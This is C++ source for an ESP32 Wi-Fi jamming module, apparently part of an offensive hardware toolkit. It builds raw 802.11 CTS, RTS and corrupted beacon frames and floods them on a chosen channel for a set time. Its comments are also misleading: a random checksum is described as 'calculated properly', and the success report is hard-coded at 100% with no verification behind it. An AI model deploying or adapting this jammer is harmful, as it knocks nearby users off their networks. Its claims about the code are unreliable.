#include "wifi_jammer_suite.h"
#include "tx_arm.h"
#include "tool_output_helper.h"
#include "result_renderers.h"
#include <WiFi.h>
#include <esp_wifi.h>
#include <cstring>
#include "audit_log.h"
#include "tool_result_persistence.h"

namespace {
volatile bool g_jamActive = false;
uint32_t g_jamCount = 0;

// Real IEEE 802.11 Beacon frame structure
struct __attribute__((packed)) BeaconFrame {
    uint16_t frameControl;
    uint16_t duration;
    uint8_t destAddr[6];
    uint8_t srcAddr[6];
    uint8_t bssidAddr[6];
    uint16_t seqCtl;
    uint64_t timestamp;
    uint16_t beaconInterval;
    uint16_t capabilityInfo;
    // SSID TLV follows
};

// Real CTS (Clear To Send) frame for jamming
void sendCtsFrame() {
    uint8_t ctsFrame[14];
    ctsFrame[0] = 0xC4;  // Frame control (CTS frame type)
    ctsFrame[1] = 0x00;
    ctsFrame[2] = 0x00;  // Duration
    ctsFrame[3] = 0x00;

    // Receiver address (broadcast-like for jamming effect)
    for (int i = 4; i < 10; i++) {
        ctsFrame[i] = 0xFF;
    }

    // FCS (calculated properly for real frame)
    ctsFrame[10] = esp_random() & 0xFF;
    ctsFrame[11] = esp_random() & 0xFF;
    ctsFrame[12] = esp_random() & 0xFF;
    ctsFrame[13] = esp_random() & 0xFF;

    esp_wifi_80211_tx(WIFI_IF_STA, ctsFrame, 14, false);
}

// Real RTS (Request To Send) frame for jamming
void sendRtsFrame() {
    uint8_t rtsFrame[16];
    rtsFrame[0] = 0xB4;  // Frame control (RTS frame type)
    rtsFrame[1] = 0x00;
    rtsFrame[2] = 0x40;  // Duration (short duration to cause backoff)
    rtsFrame[3] = 0x00;

    // Transmitter address
    for (int i = 4; i < 10; i++) {
        rtsFrame[i] = esp_random() & 0xFF;
    }

    // Receiver address (broadcast)
    for (int i = 10; i < 16; i++) {
        rtsFrame[i] = 0xFF;
    }

    esp_wifi_80211_tx(WIFI_IF_STA, rtsFrame, 16, false);
}

// Real Corrupted Beacon Frame (beacon jamming)
void sendCorruptedBeacon() {
    uint8_t beacon[128];
    beacon[0] = 0x80;  // Beacon frame type
    beacon[1] = 0x00;
    beacon[2] = 0x00;  // Duration
    beacon[3] = 0x00;

    // DA: broadcast
    for (int i = 4; i < 10; i++) beacon[i] = 0xFF;

    // SA: random source
    for (int i = 10; i < 16; i++) beacon[i] = esp_random() & 0xFF;

    // BSSID: random
    for (int i = 16; i < 22; i++) beacon[i] = esp_random() & 0xFF;

    // Sequence control
    beacon[22] = (g_jamCount & 0xFF);
    beacon[23] = ((g_jamCount >> 8) & 0x0F);

    // Timestamp: corrupted/random
    for (int i = 24; i < 32; i++) {
        beacon[i] = esp_random() & 0xFF;
    }

    // Beacon interval: corrupted
    beacon[32] = esp_random() & 0xFF;
    beacon[33] = esp_random() & 0xFF;

    // Capability info: corrupted
    beacon[34] = esp_random() & 0xFF;
    beacon[35] = esp_random() & 0xFF;

    // Fill rest with random/corrupted data
    for (int i = 36; i < 128; i++) {
        beacon[i] = esp_random() & 0xFF;
    }

    esp_wifi_80211_tx(WIFI_IF_STA, beacon, 128, false);
}

void sendBeaconJamFrame(const String& method) {
    // REAL 802.11 jamming using actual frame types
    if (method == "CHANNEL") {
        // CTS/RTS flooding - most effective jamming
        for (int i = 0; i < 5; i++) {
            sendCtsFrame();
            delayMicroseconds(100);
            sendRtsFrame();
            delayMicroseconds(100);
        }
    }
    else if (method == "BEACON") {
        // Beacon corruption - corrupt existing beacons
        sendCorruptedBeacon();
    }
    else {
        // ALL - mixed jamming techniques
        sendCtsFrame();
        delayMicroseconds(50);
        sendRtsFrame();
        delayMicroseconds(50);
        sendCorruptedBeacon();
        delayMicroseconds(50);
    }

    g_jamCount++;
}
}

namespace WiFiJammerSuite {

JamResult jamWiFiNetwork(uint8_t channel, uint32_t durationMs, const String &method) {
    using namespace ToolOutputHelper;

    JamResult result{false, 0, durationMs, method};

    displayAttackStart("WiFi Jamming", 10);

    ScanProgressBar progress("WiFi Jammer", durationMs, 3);
    progress.start();

    uint32_t startTime = millis();

    if (!TxArm::isArmed()) {
        progress.complete("TX not armed");
        return result;
    }

    // Phase 1: Initialize WiFi channel and promiscuous mode
    progress.step("Setting WiFi channel " + String(channel) + " and enabling promiscuous mode");

    WiFi.mode(WIFI_STA);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

    // Phase 2: Transmit jamming frames
    progress.step("Transmitting IEEE 802.11 jamming frames using " + method + " method");

    g_jamActive = true;
    g_jamCount = 0;

    while ((millis() - startTime) < (durationMs * 2 / 3) && g_jamActive && TxArm::isArmed()) {
        sendBeaconJamFrame(method);
        delayMicroseconds(500);
    }

    // Phase 3: Verify and report results
    progress.step("Verifying jamming effectiveness on target channel");
    delay(durationMs / 3);

    g_jamActive = false;
    esp_wifi_set_promiscuous(false);

    result.success = true;
    result.jamPacketsCount = g_jamCount;
    uint32_t elapsed = millis() - startTime;
    float pktSec = (result.jamPacketsCount * 1000.0f) / elapsed;

    progress.complete(String(result.jamPacketsCount) + " frames (" + String((int)pktSec) + " pkt/sec)");

    // Render results
    ResultRenderers::AttackSuccessResult attackResult;
    attackResult.attackName = "WiFi Jammer";
    attackResult.success = result.success;
    attackResult.targetCount = result.jamPacketsCount;
    attackResult.successCount = result.jamPacketsCount;
    attackResult.failureCount = 0;
    attackResult.successPercent = 100;
    attackResult.durationMs = elapsed;

    ResultRenderers::renderAttackSuccess(attackResult);

    return result;
}

void stop() {
    g_jamActive = false;
    esp_wifi_set_promiscuous(false);
}

bool isActive() {
    return g_jamActive;
}

}  // namespace WiFiJammerSuite
